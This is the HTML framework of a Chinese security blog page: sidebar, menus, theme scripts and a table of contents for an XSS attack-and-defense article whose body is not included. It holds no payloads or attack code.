style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">This is my blog! **</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">出发吧，诗和远方</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">cgjil</h1><div class="author-info__desc">你好啊，出发吧</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/anzhiyu-c" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/372204786" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">1.跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.1  漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-XSS-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 XSS 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1  攻击模型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-XSS-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 XSS 漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-XSS-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 XSS 漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-XSS-%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-number">1.5.</span> <span class="toc-text">1.5  XSS 漏洞分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.5.1  反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-2-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.5.2.</span> <span class="toc-text">1.5.2  存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-3DOM%E5%9E%8BXSS"><span class="toc-number">1.5.3.</span> <span class="toc-text">1.5.3DOM型XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-XSS-%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">2.XSS 攻防案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%9B%BA%E5%AE%9A%E4%BC%9A%E8%AF%9D"><span class="toc-number">2.1.</span> <span class="toc-text">2.1  固定会话</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1  原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-xss%E5%B9%B3%E5%8F%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2  xss平台</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-%E7%AA%83%E5%8F%96"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3  窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-%E6%AC%BA%E9%AA%97"><span class="toc-number">2.1.4.</span> <span class="toc-text">2.1.4  欺骗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-5-%E5%BD%B1%E5%93%8D"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.1.5  影响</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-6-%E9%98%B2%E5%BE%A1"><span class="toc-number">2.1.6.</span> <span class="toc-text">2.1.6  防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-XSS-%E6%94%BB%E9%98%B2"><span class="toc-number">3.</span> <span class="toc-text">3.XSS 攻防</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-XSS-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 XSS 构造方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-1-%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.1.</span> <span class="toc-text">3.1.1  利用&lt;&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-2-javascript-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.1.2.</span> <span class="toc-text">3.1.2  javascript 伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-4-%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.1.4  其他标签</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-5-%E5%8F%82%E8%80%83"><span class="toc-number">3.1.4.</span> <span class="toc-text">3.1.5  参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-XSS-%E5%8F%98%E5%BD%A2%E6%96%B9%E5%BC%8F"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 XSS 变形方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2"><span class="toc-number">3.2.1.</span> <span class="toc-text">3.2.1大小写转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-2-%E5%85%B3%E9%94%AE%E5%AD%97%E5%8F%8C%E5%86%99"><span class="toc-number">3.2.2.</span> <span class="toc-text">3.2.2  关键字双写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-3-%E5%AF%B9%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A0%81"><span class="toc-number">3.2.3.</span> <span class="toc-text">3.2.3  对伪协议进行转码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-4-%E6%8F%92%E5%85%A5%E5%85%B6%E4%BB%96%E5%AD%97%E7%AC%A6"><span class="toc-number">3.2.4.</span> <span class="toc-text">3.2.4  插入其他字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-5-%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">3.2.5.</span> <span class="toc-text">3.2.5  引号的使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-6-%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC"><span class="toc-number">3.2.6.</span> <span class="toc-text">3.2.6  &#x2F; 代替空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-7-%E6%8B%86%E5%88%86%E8%B7%A8%E7%AB%99"><span class="toc-number">3.2.7.</span> <span class="toc-text">3.2.7  拆分跨站</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-XSS-%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 XSS 的防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-1-%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-number">3.3.1.</span> <span class="toc-text">3.3.1  输入过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-2-%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81"><span class="toc-number">3.3.2.</span> <span class="toc-text">3.3.2  输出编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-3-%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.3.3  黑白名单策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-4-%E9%98%B2%E5%BE%A1DOM%E5%9E%8BXSS"><span class="toc-number">3.3.4.</span> <span class="toc-text">3.3.4  防御DOM型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-5-%E7%BB%88%E6%9E%81%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-number">3.3.5.</span> <span class="toc-text">3.3.5  终极测试代码</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/28/%E6%BC%8F%E6%B4%9E/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/" title="业务安全"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/15.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="业务安全"/></a><div class="content"><a class="title" href="/2022/11/28/%E6%BC%8F%E6%B4%9E/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/" title="业务安全">业务安全</a><time datetime="2022-11-28T12:59:01.000Z" title="发表于 2022-11-28 20:59:01">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/27/%E6%BC%8F%E6%B4%9E/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/" title="服务器请求伪造（SSRF）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/19.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="服务器请求伪造（SSRF）"/></a><div class="content"><a class="title" href="/2022/11/27/%E6%BC%8F%E6%B4%9E/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/" title="服务器请求伪造（SSRF）">服务器请求伪造（SSRF）</a><time datetime="2022-11-27T12:59:57.000Z" title="发表于 2022-11-27 20:59:57">2022-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/24/%E6%BC%8F%E6%B4%9E/%E5%A4%B1%E6%95%88%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/" title="失效的访问控制"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/19.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="失效的访问控制"/></a><div class="content"><a class="title" href="/2022/11/24/%E6%BC%8F%E6%B4%9E/%E5%A4%B1%E6%95%88%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/" title="失效的访问控制">失效的访问控制</a><time datetime="2022-11-24T12:57:35.000Z" title="发表于 2022-11-24 20:57:35">2022-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/27.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反序列化"/></a><div class="content"><a class="title" href="/2022/11/21/%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">反序列化</a><time datetime="2022-11-21T12:58:40.000Z" title="发表于 2022-11-21 20:58:40">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/19/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/image/31.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件包含"/></a><div class="content"><a class="title" href="/2022/11/19/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">文件包含</a><time datetime="2022-11-19T12:57:08.000Z" title="发表于 2022-11-19 20:57:08">2022-11-19</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">4</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>3</sup></a><a href="/tags/Windows/" style="font-size: 0.88rem;">Windows<sup>4</sup></a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 0.88rem;">脚本<sup>1</sup></a><a href="/tags/%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">语言<sup>6</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.6",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 cgjil 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://pinglun-ixrqfq3ea-xingloveyues-projects.vercel.app/',
      pageview: true,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: true,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('https://pinglun-ixrqfq3ea-xingloveyues-projects.vercel.app/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "visitor@anheyu.com";
